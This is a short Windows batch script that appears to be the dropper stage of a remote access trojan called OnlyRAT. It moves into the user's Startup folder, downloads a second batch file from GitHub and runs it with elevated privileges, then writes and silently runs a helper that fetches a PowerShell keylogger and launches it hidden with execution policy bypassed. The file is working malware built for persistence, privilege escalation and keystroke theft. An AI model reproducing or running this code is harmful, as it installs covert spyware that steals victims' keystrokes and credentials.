@echo off

set "initialPath=%cd%"

set "startup=C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

cd /d "%startup%"

REM Download admin.bat from GitHub and run it with elevated privileges
powershell -c "(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/Sayuru99/OnlyRAT/main/resources/admin/admin.bat', '%startup%\admin.bat')"
powershell -c "Start-Process cmd.exe -ArgumentList '/c \"%startup%\admin.bat\"' -Verb RunAs"

REM Create a script to download the keylogger.ps1 file
echo powershell -c "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Sayuru99/OnlyRAT/main/resources/keylogg.ps1' -OutFile 'keylogg.ps1'; Start-Process powershell.exe -ArgumentList '-ExecutionPolicy Bypass -File \"%startup%\keylogg.ps1\"' -WindowStyle Hidden" > down.cmd

REM Run the script to download the keylogger.ps1 file
powershell -Command "Start-Process cmd.exe -ArgumentList '/c \"%startup%\down.cmd\"' -WindowStyle Hidden"

cd /d "%initialPath%"

REM Delete the initial script if needed
REM del initial.cmd
